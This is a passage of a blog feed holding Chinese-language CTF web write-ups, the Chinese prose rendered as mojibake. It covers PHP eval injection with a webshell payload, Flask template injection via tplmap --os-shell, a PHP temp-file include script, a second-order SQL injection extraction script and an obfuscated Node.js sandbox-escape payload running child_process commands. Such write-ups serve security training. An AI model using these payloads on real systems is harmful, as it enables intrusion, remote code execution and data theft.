punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">'home'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//echo $class;</span><span class="token variable">$method</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">'index'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//echo $method;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$method</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">,</span><span class="token string">'home'</span><span class="token punctuation">,</span><span class="token string">'back'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$class_init_config</span><span class="token operator">=</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token variable">$class_init_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$class_init_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>index.phpä¸­å®žçŽ°äº†æœ‰ä¸€ä¸ªç±»è‡ªåŠ¨åŠ è½½ï¼Œå¯ä»¥ä»¥<code>http://ip/class/method</code>çš„å½¢å¼åŽ»è°ƒç”¨å¯¹åº”ç±»çš„å‡½æ•°ï¼Œç„¶åŽåœ¨<code>class</code>æ–‡ä»¶å¤¹ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ä¸º<code>home.class.php</code>ã€ <code>upload.class.php</code> ã€<code>back.class.php</code>ï¼Œåˆ†åˆ«å¯¹åº”ä¸»é¡µã€ä¸Šä¼ å’Œå¤‡ä»½åŠŸèƒ½çš„å®žçŽ°</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//back.class.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">back</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dest</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dest</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'dest'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'backup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">backup</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$dest</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'profile/'</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">random_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_write</span><span class="token punctuation">(</span><span class="token variable">$dest</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_create</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$password</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* å…ˆéªŒè¯ä¿è¯ä¸ºå¤‡ä»½æ–‡ä»¶åŽ,å†ä¿å­˜ä¸ºç§è—æ–‡ä»¶ */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_write</span><span class="token punctuation">(</span><span class="token variable">$dest</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$f1</span><span class="token operator">=</span><span class="token variable">$dest</span><span class="token punctuation">;</span>        <span class="token variable">$f2</span><span class="token operator">=</span><span class="token string">'private/'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">random_code</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>        <span class="token variable">$stream_f1</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$f1_read</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^&lt;\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]{8}\"\?print\(\".*\"\):exit\(\); $/s'</span><span class="token punctuation">,</span> <span class="token variable">$f1_read</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span> <span class="token variable">$f2</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php exit(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_create</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_content</span><span class="token operator">=</span><span class="token string">'&lt;?php $_GET["password"]==="'</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">.</span><span class="token string">'"?print("'</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">'"):exit(); '</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$_content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">random_code</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">,</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>é˜…è¯»ä»£ç å¯ä»¥å‘çŽ°ï¼Œç¨‹åºé¦–å…ˆå°†<code>$filename</code>æ‹¼æŽ¥åˆ°<code>profile/</code>ï¼Œç„¶åŽæ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å‡ºæ¥è¿›è¡Œhtmlç¼–ç ï¼Œç„¶åŽç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸²ä½œä¸ºè¯»å–æ–‡ä»¶å†…å®¹çš„å¯†ç ï¼Œä¹‹åŽè°ƒç”¨<code>_create()</code>å‡½æ•°ï¼Œå°†å¯†ç å’Œhtmlç¼–ç åŽçš„æ–‡ä»¶å†…å®¹ï¼Œæ‹¼æŽ¥åˆ°<code>'&lt;?php $_GET["password"]==="'.$password.'"?print("'.$content.'"):exit(); '</code>é‡Œï¼Œä¹‹åŽè°ƒç”¨<code>_write()</code>å‡½æ•°ï¼Œå°†ä¸Šé¢è¿™æ®µphpä»£ç å†™è¿›<code>private</code>ç›®å½•ï¼Œç„¶åŽå¯¹æ–‡ä»¶å†…å®¹å†…å®¹è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æ£€æµ‹ï¼Œè‹¥é€šè¿‡æ£€æµ‹,å°†æ–‡ä»¶å†…å®¹å†™è¿›<code>$dest</code>ï¼Œå¹¶å¤åˆ¶ä¸€ä»½åˆ°<code>$f2</code>ï¼Œè‹¥æ²¡æœ‰é€šè¿‡æ£€æµ‹ï¼Œåˆ™åœ¨<code>$dest</code>ä¸­å†™å…¥<code>&lt;?php exit(); ?&gt;</code>ã€‚</p><p>ç†æ¸…ç¨‹åºå¤§ä½“æµç¨‹åŽï¼Œå¤§è‡´çš„æ”»å‡»æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªtxtçš„æ–‡ä»¶ï¼Œç„¶åŽå†é€šè¿‡backç”Ÿæˆphpæ–‡ä»¶ï¼Œå¼€å§‹å°è¯•ä½¿ç”¨<code>"?&gt;</code>é—­åˆå‰é¢ï¼Œä½†æ˜¯ä¸èƒ½æˆåŠŸï¼Œ<code>htmlspecialchars()</code>ä¼šå°†åŒå¼•å·å’Œå°–æ‹¬å·ç¼–ç ï¼Œä¹‹åŽé‡‡ç”¨å¤æ‚è¯­æ³•ï¼Œ<code>{${phpinfo()}}</code>è¿›è¡Œrceã€‚</p><p>ä¸Šä¼ 3.txt</p><pre><code>${eval($_GET[0])}</code></pre><p><img src="/2021/08/26/wang-ding-bei-2020-novel/image-20210824025929370.png" alt="image-20210824025929370"></p><pre><code>private/KF2C2E85XJ.php?password=JRzPNLZz&amp;&amp;0=echo `cat /flag.txt`;</code></pre><p><img src="/2021/08/26/wang-ding-bei-2020-novel/image-20210824025838664.png" alt="image-20210824025838664"></p>]]></content>
      
      
      
        <tags>
            
            <tag> backup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoosterCTFï¼š2019-I_&lt;3_Flask</title>
      <link href="2021/08/25/roosterctf-2019-i-3-flask/"/>
      <url>2021/08/25/roosterctf-2019-i-3-flask/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822224810737.png" alt="image-20210822224810737"></p><p>å…ˆç”¨<a href="https://github.com/s0md3v/Arjun">Arjun</a>å·¥å…·å¯¹å¯åˆ©ç”¨ä¼ å‚è¿›è¡Œçˆ†ç ´ï¼š</p><pre class=" language-shell"><code class="language-shell">python3 arjun.py -u http://xxx.node3.buuoj.cn/  -m GET -c 200</code></pre><p>å¾—åˆ°å‚æ•°åï¼š<code>name</code></p><pre class=" language-python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822224932908.png" alt="image-20210822224932908"></p><p>å­˜åœ¨æ¨¡ç‰ˆæ³¨å…¥æ¼æ´žï¼Œä½¿ç”¨<strong>tplmap</strong>è¿›è¡Œæ‰«æï¼Œè¿™é‡Œæ³¨æ„å®‰è£…</p><pre><code>pip2 install pyyaml</code></pre><pre><code>python2 tplmap.py -u http://9422d4e6-60bf-4b23-81a7-15c094f09a85.node4.buuoj.cn:81/?name=1</code></pre><p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822230501352.png" alt="image-20210822230501352">å¾—åˆ°è¿”å›žç»“æžœï¼š<code>Engine: Jinja2</code></p><pre><code>python2 tplmap.py -u http://9422d4e6-60bf-4b23-81a7-15c094f09a85.node4.buuoj.cn:81/?name=1 --os-shell</code></pre><p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822230641085.png" alt="image-20210822230641085"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTFï¼š2020-ezinclude</title>
      <link href="2021/08/24/npuctf-2020-ezinclude/"/>
      <url>2021/08/24/npuctf-2020-ezinclude/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042020026.png" alt="image-20210821042020026"></p><p>æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œç–‘ä¼¼å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»</p><p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042334904.png" alt="image-20210821042334904"></p><p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042441516.png" alt="image-20210821042441516"></p><p>å¾—åˆ°äº† flflflflag.php ï¼Œè®¿é—®é‡å®šå‘åˆ°äº†å…¶ä»–é¡µé¢ï¼ŒæŠ“åŒ…æŠ“å›žæ¥ï¼Œé¡µé¢æç¤º include($_GET[â€œfileâ€]) ï¼Œæ‰«ç›®å½•å¯ä»¥å¾—åˆ° dir.php ,åŒ…å«ä»–å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¡µé¢åˆ—å‡ºäº† /tmp ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042648999.png" alt="image-20210821042648999"></p><p>ä½¿ç”¨è„šæœ¬å°è¯•å†™å…¥shell</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOpayload <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo()?>"</span>file_data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>url <span class="token operator">=</span> <span class="token string">"http://949f7699-486f-4650-83c3-3a1432afb3b6.node4.buuoj.cn:81/flflflflag.php?"</span>\      <span class="token operator">+</span><span class="token string">"file=php://filter/string.strip_tags/resource=/etc/passwd"</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file_data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>ç„¶åŽè®¿é—® dir.php å¯ä»¥å¾—åˆ°ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼ŒåŒ…å«ä¹‹å³å¯RCE</p><p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821043053572.png" alt="image-20210821043053572"></p><p>flagå°±åœ¨phpinfoé¡µé¢<br><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821043229435.png" alt="image-20210821043229435"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯ï¼š2018-Unfinish</title>
      <link href="2021/08/23/wang-ding-bei-2018-unfinish/"/>
      <url>2021/08/23/wang-ding-bei-2018-unfinish/</url>
      
        <content type="html"><![CDATA[<p>å‘çŽ°è¿™æ˜¯ä¸€ä¸ªäºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®ï¼Œæ³¨å…¥ç‚¹æ˜¯åœ¨register.phpä¼ å…¥çš„usernameä¸­ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://655262d1-95df-4efd-81d7-d2ac3608e9d3.node4.buuoj.cn:81/'</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"0'+ascii(substr((select * from flag) from {} for 1))+'0"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    register <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'email'</span><span class="token punctuation">:</span><span class="token string">'abc{}@qq.com'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123456'</span><span class="token punctuation">}</span>    login <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'email'</span><span class="token punctuation">:</span><span class="token string">'abc{}@qq.com'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123456'</span><span class="token punctuation">}</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    r1 <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'register.php'</span><span class="token punctuation">,</span>data <span class="token operator">=</span> register<span class="token punctuation">)</span>    r2 <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'login.php'</span><span class="token punctuation">,</span> data <span class="token operator">=</span> login<span class="token punctuation">)</span>    r3 <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'index.php'</span><span class="token punctuation">)</span>    html <span class="token operator">=</span> r3<span class="token punctuation">.</span>text    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>    UserName <span class="token operator">=</span> soup<span class="token punctuation">.</span>span<span class="token punctuation">.</span>string<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> int<span class="token punctuation">(</span>UserName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    m <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>UserName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HFCTFï¼š2020-JustEscape</title>
      <link href="2021/08/22/hfctf-2020-justescape/"/>
      <url>2021/08/22/hfctf-2020-justescape/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822202143514.png" alt="image-20210822202143514"></p><h5 id="run-php"><a href="#run-php" class="headerlink" title="run.php"></a>run.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string">"code"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'code'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h5 id="run-php-code-2-2b6-7-3"><a href="#run-php-code-2-2b6-7-3" class="headerlink" title="/run.php?code=(2%2b6-7)/3;"></a>/run.php?code=(2%2b6-7)/3;</h5><p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822202932575.png" alt="image-20210822202932575"></p><p>åˆç”±äºŽeval()å‡½æ•°ä¸ä»…ä»…æ˜¯phpå«æœ‰çš„ï¼ŒNode.jsä¹Ÿæœ‰è¿™ä¸ªå‡½æ•°</p><h5 id="run-php-code-Error-stack"><a href="#run-php-code-Error-stack" class="headerlink" title="/run.php?code=Error().stack"></a>/run.php?code=Error().stack</h5><p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822203011872.png" alt="image-20210822203011872"></p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>/run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})()</code></pre><p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822203208148.png" alt="image-20210822203208148"></p><pre><code>(function (){    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();    try{        Object.preventExtensions(Buffer.from(``)).a = 1;    }catch(e){        return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();    }})()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> node.jsæ²™ç®±é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
